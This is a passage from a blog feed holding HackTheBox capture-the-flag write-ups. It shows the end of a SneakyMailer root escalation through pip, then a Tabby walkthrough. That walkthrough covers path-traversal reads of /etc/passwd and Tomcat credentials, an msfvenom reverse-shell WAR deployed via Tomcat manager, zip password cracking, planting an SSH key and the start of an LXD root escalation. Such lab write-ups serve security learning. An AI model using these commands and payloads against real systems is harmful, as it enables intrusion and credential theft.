&gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">low@sneakymailer:/tmp$ sudo /usr/bin/pip3 install <span class="variable">$TF</span></span><br><span class="line">Processing ./tmp.1DjWlARdXF</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">bxxxxxxxxxxxxxxxxxxxxxxxx6</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ftp </tag>
            
            <tag> gtfobins </tag>
            
            <tag> sneakymailer </tag>
            
            <tag> smtp </tag>
            
            <tag> fishing </tag>
            
            <tag> imap </tag>
            
            <tag> swaks </tag>
            
            <tag> php reverse shell </tag>
            
            <tag> pypi </tag>
            
            <tag> pypiserver </tag>
            
            <tag> htpasswd </tag>
            
            <tag> setuptools </tag>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Tabby</title>
      <link href="/posts/tabby/"/>
      <url>/posts/tabby/</url>
      
        <content type="html"><![CDATA[<img width="578" alt="tabby hackthebox" src="https://user-images.githubusercontent.com/9076747/85604359-8482eb00-b651-11ea-875c-b0404fac77b9.png"><p>Tabby just retired on HackTheBox. It’s an easy difficulty Linux box. While rated easy the user part was about Tomcat and the root part about LXD, two softwares I had never used before this box so it gave me a little of trouble at first but I learned a lot of neat tricks and a better understanding of how those two tools works and vulnerabilities that can arise from them.<br>In the end it’s a very well designed box with a lot of real life scenarios that I enjoyed working with. </p><p><strong>Tl;Dr:</strong> To get the user flag you first had to find an Local File Inclusion vulnerability in the main application. Using this LFI you could retrieve the users credentials of the Tomcat instance running on port 8080. With this account you can access Tomcat Manager Deploy feature and upload a malicious <code>.war</code> file to open a reverse shell. Once on the box as <code>tomcat</code> user you stumble across a password-protected zip file. Cracking the password gives you the actual password of <code>ash</code> user, allowing you to pivot to his account and retrieve the user flag.<br>To get the root flag you have to leverage <code>ash</code> user privilege to use LXD API in order to mount the host’s full <code>root</code> filesystem into a container with elevated privileges and from inside the container, read the root flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.194 tabby.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC tabby.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> tabby.htb (10.10.10.194)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Mega Hosting</span><br><span class="line">8080/tcp open  http    Apache Tomcat</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Apache Tomcat</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>We have a web server on port 80 running Apache, another web server on port 8080 running Apache Tomcat and finally the SSH port 22 open.</p><p>Opening <a href="http://tabby.htb/">http://tabby.htb</a> display a following page:</p><p><img src="https://user-images.githubusercontent.com/9076747/85779795-43a7d680-b724-11ea-8452-807a88471ca8.png" alt="tabby homepage"></p><p>From there we notice an interesting statement:</p><blockquote><p>We have recently upgraded several services. Our servers are now more secure than ever. </p><p><strong>Read our statement on recovering from the data breach</strong></p></blockquote><p>The statement page redirect to a new hostname: <code>http://megahosting.htb</code>. Let’s add it to our host file before continuing:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.194 megahosting.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Opening the “recovering from data breach” statement doesn’t return any useful information:</p><blockquote><p>We apologise to all our customers for the previous data breach.</p><p>We have changed the site to remove this tool, and have invested heavily in more secure servers</p></blockquote><p>We don’t know what tool they are talking about and since it’s been removed we won’t be able to exploit it either. Yet this page got one interesting part, its URL: <code>http://megahosting.htb/news.php?file=statement</code></p><p>Given the <code>file</code> parameter it looks like the page fetch a file named <code>statement</code> and displays its content. Looks like a perfect scenario for Local File Inclusion.</p><h3 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h3><p>Let’s try to exploit LFI to access the classical <code>/etc/passwd</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;megahosting.htb/news.php?file=../etc/passwd&quot;</span></span><br><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;megahosting.htb/news.php?file=../../etc/passwd&quot;</span> </span><br><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;megahosting.htb/news.php?file=../../../etc/passwd&quot;</span></span><br><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;megahosting.htb/news.php?file=../../../../etc/passwd&quot;</span> -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 1850</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">[...]</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/<span class="literal">false</span></span><br><span class="line">tomcat:x:997:997::/opt/tomcat:/bin/<span class="literal">false</span></span><br><span class="line">ash:x:1000:1000:clive:/home/ash:/bin/bash</span><br></pre></td></tr></table></figure><p>Bingo, we just confirmed we can do LFI. Now what ? If we can find any sensible file on the server we should be able to read its source code.</p><p>Let’s run <code>gobuster</code> to see if any interesting files can be found:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://tabby.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php,txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/Readme.txt (Status: 200)</span><br><span class="line">/assets (Status: 301)</span><br><span class="line">/favicon.ico (Status: 200)</span><br><span class="line">/files (Status: 301)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/news.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br></pre></td></tr></table></figure><p>Nothing interesting here, except the <code>files</code> folder but we don’t have permission to access it. Let’s move on.</p><p>At this point I didn’t get any interesting results. So I started to dig a bit into the Tomcat instance running on port 8080.</p><h3 id="Analyzing-Tomcat-instance"><a href="#Analyzing-Tomcat-instance" class="headerlink" title="Analyzing Tomcat instance"></a>Analyzing Tomcat instance</h3><p>Opening <code>http://tabby.htb:8080</code> returns the defaults Tomcat homepage:</p><p><img src="https://user-images.githubusercontent.com/9076747/86395959-67799800-bca1-11ea-9bb6-a28f5624cbd3.png" alt="tabby homepage"></p><p>That was the first time for me using Tomcat so I was surprised to get so much informations on the default homepage, which is super useful for us. Amongst the documentation we learn that the file <code>tomcat-users.xml</code> contains a list of users and their respective permission:</p><blockquote><p>For security reasons, using the manager webapp is restricted to users  with role “manager-gui”. The host-manager webapp is restricted to users  with role “admin-gui”. Users are defined in <code>/etc/tomcat9/tomcat-users.xml</code>.</p></blockquote><p>Looks exactly what we need, especially since we found an LFI earlier. Let’s grab this file to see if we can gather juicy accounts.</p><h3 id="LFI-to-Tomcat-conf-files"><a href="#LFI-to-Tomcat-conf-files" class="headerlink" title="LFI to Tomcat conf files"></a>LFI to Tomcat conf files</h3><p>The documentation state that the user file is located at <code>/etc/tomcat9/tomcat-users.xml</code>, let’s get it using LFI:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://megahosting.htb/news.php?file=../../../../etc/tomcat9/tomcat-users.xml&quot;</span> -I</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Bummer! No results…</p><p>Maybe Tomcat got installed in a different location? We know the server is running <code>Ubuntu</code> so let’s check the files location of the default <code>tomcat9</code> on Ubuntu. The <a href="https://packages.ubuntu.com/en/eoan/all/tomcat9/filelist">documentation list the following files</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/etc/cron.daily/tomcat9</span><br><span class="line">/etc/rsyslog.d/tomcat9.conf</span><br><span class="line">/etc/tomcat9/policy.d/01system.policy</span><br><span class="line">/etc/tomcat9/policy.d/02debian.policy</span><br><span class="line">/etc/tomcat9/policy.d/03catalina.policy</span><br><span class="line">/etc/tomcat9/policy.d/04webapps.policy</span><br><span class="line">/etc/tomcat9/policy.d/50local.policy</span><br><span class="line">/lib/systemd/system/tomcat9.service</span><br><span class="line">/usr/lib/sysusers.d/tomcat9.conf</span><br><span class="line">/usr/lib/tmpfiles.d/tomcat9.conf</span><br><span class="line">/usr/libexec/tomcat9/tomcat-start.sh</span><br><span class="line">/usr/libexec/tomcat9/tomcat-update-policy.sh</span><br><span class="line">/usr/share/doc/tomcat9/README.Debian</span><br><span class="line">/usr/share/doc/tomcat9/changelog.Debian.gz</span><br><span class="line">/usr/share/doc/tomcat9/copyright</span><br><span class="line">/usr/share/tomcat9-root/default_root/META-INF/context.xml</span><br><span class="line">/usr/share/tomcat9-root/default_root/index.html</span><br><span class="line">/usr/share/tomcat9/default.template</span><br><span class="line">/usr/share/tomcat9/etc/catalina.properties</span><br><span class="line">/usr/share/tomcat9/etc/context.xml</span><br><span class="line">/usr/share/tomcat9/etc/jaspic-providers.xml</span><br><span class="line">/usr/share/tomcat9/etc/logging.properties</span><br><span class="line">/usr/share/tomcat9/etc/server.xml</span><br><span class="line">/usr/share/tomcat9/etc/tomcat-users.xml</span><br><span class="line">/usr/share/tomcat9/etc/web.xml</span><br><span class="line">/usr/share/tomcat9/logrotate.template</span><br><span class="line">/var/lib/tomcat9/conf</span><br><span class="line">/var/lib/tomcat9/logs</span><br><span class="line">/var/lib/tomcat9/work</span><br></pre></td></tr></table></figure><p>We missed the full path of the file, let’s try again with the correct path for Ubuntu:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml&quot;</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">   &lt;role rolename=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span><br><span class="line">   &lt;role rolename=<span class="string">&quot;manager-script&quot;</span>/&gt;</span><br><span class="line">   &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;<span class="variable">$3cureP4s5w0rd123</span>!&quot;</span> roles=<span class="string">&quot;admin-gui,manager-script&quot;</span>/&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Bingo! We got credentials for <code>tomcat</code> user which have <code>admin-gui</code> and <code>manager-script</code> role.</p><p>Reading through the documentation we find an interesting thing about <code>manager-script</code> role. It allows us to deploy custom packages in the format of WAR files:</p><blockquote><p>There is a tool called the Client Deployer, which can be used from a command line and provides additional functionality such as compiling and validating web applications as well as packaging web application into web application resource (WAR) files. </p><p><a href="http://tomcat.apache.org/tomcat-9.0-doc/deployer-howto.html">http://tomcat.apache.org/tomcat-9.0-doc/deployer-howto.html</a></p></blockquote><p>Basically a WAR package is a container for JSP and various others file that constitute a web application. </p><p>Well since we have permission to deploy apps, maybe we can create a WAR package containing a JSP webshell? </p><h3 id="Deploying-malicious-WAR-package"><a href="#Deploying-malicious-WAR-package" class="headerlink" title="Deploying malicious WAR package"></a>Deploying malicious WAR package</h3><p>After gathering a bit more informations about Tomcat we understand that a <code>.war</code>  packages is a web application directory hierarchy in ZIP format.</p><p>We can use <code>msfvenom</code> to easily generate a malicious <code>war</code> package and verify it’s structure:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ msfvenom -p java/shell_reverse_tcp lhost=10.10.10.10 lport=8585 -f war -o hg8.war</span><br><span class="line"></span><br><span class="line">Payload size: 13402 bytes</span><br><span class="line">Final size of war file: 13402 bytes</span><br><span class="line">Saved as: hg8.war</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ unzip hg8.war</span><br><span class="line">Archive:  hg8.war</span><br><span class="line">   creating: WEB-INF/</span><br><span class="line">  inflating: WEB-INF/web.xml</span><br><span class="line">   creating: WEB-INF/classes/</span><br><span class="line">   creating: WEB-INF/classes/metasploit/</span><br><span class="line">  inflating: WEB-INF/classes/metasploit/Payload.class</span><br><span class="line">  inflating: WEB-INF/classes/metasploit/PayloadServlet.class</span><br><span class="line">   creating: WEB-INF/classes/javapayload/</span><br><span class="line">   creating: WEB-INF/classes/javapayload/stage/</span><br><span class="line">  inflating: WEB-INF/classes/javapayload/stage/Stage.class</span><br><span class="line">  inflating: WEB-INF/classes/javapayload/stage/StreamForwarder.class</span><br><span class="line">  inflating: WEB-INF/classes/javapayload/stage/Shell.class</span><br></pre></td></tr></table></figure><p>We now have our package ready. Let’s open our <code>nc</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And deploy the package using the <code>manager-script</code> function:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -u <span class="string">&#x27;tomcat:$3cureP4s5w0rd123!&#x27;</span> -T hg8.war <span class="string">&quot;http://megahosting.htb:8080/manager/text/deploy?path=/hg8.war&quot;</span></span><br><span class="line">OK - Deployed application at context path [/hg8.war]</span><br></pre></td></tr></table></figure><p>As soon as we open the page, a new connection appear on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://megahosting.htb:8080/hg8.war</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.194:56096</span><br><span class="line">id</span><br><span class="line">uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)</span><br><span class="line"></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">tomcat@tabby:/$</span><br></pre></td></tr></table></figure><h3 id="Pivot-tomcat-gt-ash-user"><a href="#Pivot-tomcat-gt-ash-user" class="headerlink" title="Pivot tomcat -&gt; ash user"></a>Pivot tomcat -&gt; ash user</h3><p>Alright we now have shell as <code>tomcat</code>. Looking at the <code>/home/</code> directory we see that the user flag is in <code>/home/ash/</code> directory. </p><p>Let’s looks around to see if we can find any way to pivot to <code>ash</code> user. First thing first I checked what’s inside the <code>files</code> folder we found at the beginning:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/$ ls /var/www/html/files</span><br><span class="line">16162020_backup.zip  archive  revoked_certs  statement</span><br></pre></td></tr></table></figure><p>This backup archive looks promising. Maybe we can find juicy files in it ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget http://tabby.htb/files/16162020_backup.zip</span><br><span class="line">‘16162020_backup.zip’ saved [8716/8716]</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook~]$ unzip 16162020_backup.zip</span><br><span class="line">Archive:  16162020_backup.zip</span><br><span class="line">   creating: var/www/html/assets/</span><br><span class="line">[16162020_backup.zip] var/www/html/favicon.ico password:</span><br><span class="line">password incorrect--reenter:</span><br></pre></td></tr></table></figure><p>Bummer it’s encrypted… Maybe we can bruteforce the password. I will use <code>John</code> as usual:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ zip2john 16162020_backup.zip &gt; zip.hashes</span><br><span class="line">[hg8@archbook ~]$ cat zip.hashes</span><br><span class="line">16162020_backup.zip:$pkzip2<span class="variable">$3</span>*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*285c*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5c67*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip2$::16162020_backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt zip.hashes</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (PKZIP [32/64])</span><br><span class="line">admin@it         (16162020_backup.zip)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Bingo! We got the password, let’s now unzip the archive:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ unzip 16162020_backup.zip</span><br><span class="line">Archive:  16162020_backup.zip</span><br><span class="line">   creating: var/www/html/assets/</span><br><span class="line">[16162020_backup.zip] var/www/html/favicon.ico password:</span><br><span class="line">  inflating: var/www/html/favicon.ico</span><br><span class="line">   creating: var/www/html/files/</span><br><span class="line">  inflating: var/www/html/index.php</span><br><span class="line"> extracting: var/www/html/logo.png</span><br><span class="line">  inflating: var/www/html/news.php</span><br><span class="line">  inflating: var/www/html/Readme.txt</span><br></pre></td></tr></table></figure><p>And well… We got nothing interesting at all in this archive. That’s disappointing but what else can we try ?<br>Maybe <code>ash</code> reused his password for encrypting the archive ?</p><p>Let’s try to use <code>admin@it</code> to connect to his account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh ash@tabby.htb</span><br><span class="line">Warning: Permanently added <span class="string">&#x27;tabby.htb,10.10.10.194&#x27;</span> (ECDSA) to the list of known hosts.</span><br><span class="line">ash@tabby.htb: Permission denied (publickey).</span><br></pre></td></tr></table></figure><p>No luck… Using <code>su -</code> then?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/$ su - ash</span><br><span class="line">su - ash</span><br><span class="line">Password: admin@it</span><br><span class="line"></span><br><span class="line">ash@tabby:~$ </span><br></pre></td></tr></table></figure><p>Let’s add our own SSH key to <code>authorized_keys</code> file in order to get a more stable shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:~$  <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAXXX= hg8@htb.htb&quot;</span> &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>And login again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb ash@tabby.htb</span><br><span class="line">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-31-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Tue May 19 11:48:00 2020</span><br><span class="line">ash@tabby:~$ cat user.txt</span><br><span class="line">8xxxxxxxxxxxxxxxxxxx4</span><br></pre></td></tr></table></figure><h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>While doing our usual recon we quickly notice that <code>ash</code> belongs to a few uncommon group:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/$ id</span><br><span class="line">uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure><p>One particularly interesting is the <code>lxd</code> group.</p><blockquote><p>LXD is a system container manager build on top of LXC (Linux Containers) that is currently supported by Canonical. The goal of LXD is to provide an experience similar to a virtual machine but through containerization rather than hardware virtualization. Compared to Docker for delivering applications, LXD offers nearly full operating-system functionality with additional features such as snapshots, live migrations, and storage management.</p><p><a href="https://linuxcontainers.org/lxd/">https://linuxcontainers.org/lxd/</a></p></blockquote><p>Doesn’t this remind you a lot of Docker? And Docker have a few interesting way to escalate privileges to root. Probably something similar exist for LXD ? Let’s dig a bit.</p><h3 id="Privilege-Escalation-via-LXD"><a href="#Privilege-Escalation-via-LXD" class="headerlink" title="Privilege Escalation via LXD"></a>Privilege Escalation via LXD</h3><p>After a bit of Google search we stumble upon an interesting article: “<a href="https://shenaniganslabs.io/2019/05/21/LXD-LPE.html">Linux Privilege Escalation via LXD &amp; Hijacked UNIX Socket Credentials</a>“.</p><p>This idea is to build an LXD container and use the LXD API to mount the host’s root filesystem into this container in order to give our  low-privilege <code>ash</code> user root access to the host filesystem. </p><p>Let’s see how it’s done now.</p><p>First let’s init LXD if it’s not already done:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/$ lxd init</span><br><span class="line">Would you like to use LXD clustering? (yes/no) [default=no]:</span><br><span class="line">Do you want to configure a new storage pool? (yes/no) [default=yes]:</span><br><span class="line">Name of the new storage pool [default=default]:</span><br><span class="line">Name of the storage backend to use (ceph, btrfs, dir, lvm) [default=btrfs]: dir</span><br><span class="line">Would you like to connect to a MAAS server? (yes/no) [default=no]:</span><br><span class="line">Would you like to create a new <span class="built_in">local</span> network bridge? (yes/no) [default=yes]:</span><br><span class="line">What should the new bridge be called? [default=lxdbr0]:</span><br><span class="line">What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:</span><br><span class="line">What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:</span><br><span class="line">Would you like LXD to be available over the network? (yes/no) [default=no]:</span><br><span class="line">Would you like stale cached images to be updated automatically? (yes/no) [default=yes]</span><br><span class="line">Would you like a YAML <span class="string">&quot;lxd init&quot;</span> preseed to be printed? (yes/no) [default=no]:</span><br></pre></td></tr></table></figure><p>Then check if images are already present on the system:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc image list</span><br><span class="line">+-------+-------------+--------+-------------+--------------+------+------+-------------+</span><br><span class="line">| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE |</span><br><span class="line">+-------+-------------+--------+-------------+--------------+------+------+-------------+</span><br></pre></td></tr></table></figure><p>No luck we don’t have any image. We will need to build our own first. Let’s head back to our own machine to do so. I will use the following script to create an basic Alpine container: <a href="https://github.com/saghul/lxd-alpine-builder.git">LXD Alpine Builder</a>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">[hg8@archpen ~]$ <span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">[hg8@archpen ~]$ sudo 